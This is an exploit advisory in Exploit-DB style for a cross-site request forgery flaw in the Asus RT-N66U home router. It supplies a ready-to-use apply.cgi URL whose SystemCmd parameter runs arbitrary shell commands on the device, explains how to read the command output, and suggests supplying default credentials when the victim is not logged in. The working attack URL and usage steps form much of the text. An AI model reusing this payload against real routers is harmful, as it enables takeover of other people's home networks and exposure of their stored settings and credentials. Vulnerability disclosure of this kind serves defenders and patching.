Exploit Title: CSRF Asus RT-N66U Arbitrary Command Execution
Google Dork: N.A.
Date: 30 September 2013
Exploit Author: cgcai (https://www.qxcg.net/arbitrary-command-execution-on-an-asus-rtn66u.html)
Vendor Homepage: http://www.asus.com/Networking/RTN66U/
Software Link: http://www.asus.com/Networking/RTN66U/#support_Download_36
Version: 3.0.0.4.374_720
Tested on: N.A.
CVE: Pending

Description:
The Asus RT-N66U is a home wireless router. Its web application has a CSRF vulnerability that allows an attacker to execute arbitrary commands on the target device.

Exploitable URL:
The parameter "SystemCmd" in the URL below causes the device to execute arbitrary commands. (The value encoded in the example is `nvram show`)

	http://192.168.1.1/apply.cgi?current_page=Main_Analysis_Content.asp&next_page=cmdRet_check.htm&next_host=192.168.1.1&group_id=&modified=0&action_mode=+Refresh+&action_script=&action_wait=&first_time=&preferred_lang=EN&SystemCmd=%6e%76%72%61%6d%20%73%68%6f%77&firmver=3.0.0.4&cmdMethod=ping&destIP=www.google.com&pingCNT=5

The URL should be submitted as a `GET` request.

Console output can be observed by sending a `GET` request to `http://192.168.1.1/cmdRet_check.htm` after calling the URL above, if so desired.

The URLs above are protected with HTTP Basic Access Authentication. If a victim has logged in to the router recently, the exploit will work without further intervention. Otherwise, attackers can try supplying default credenitals in the URL.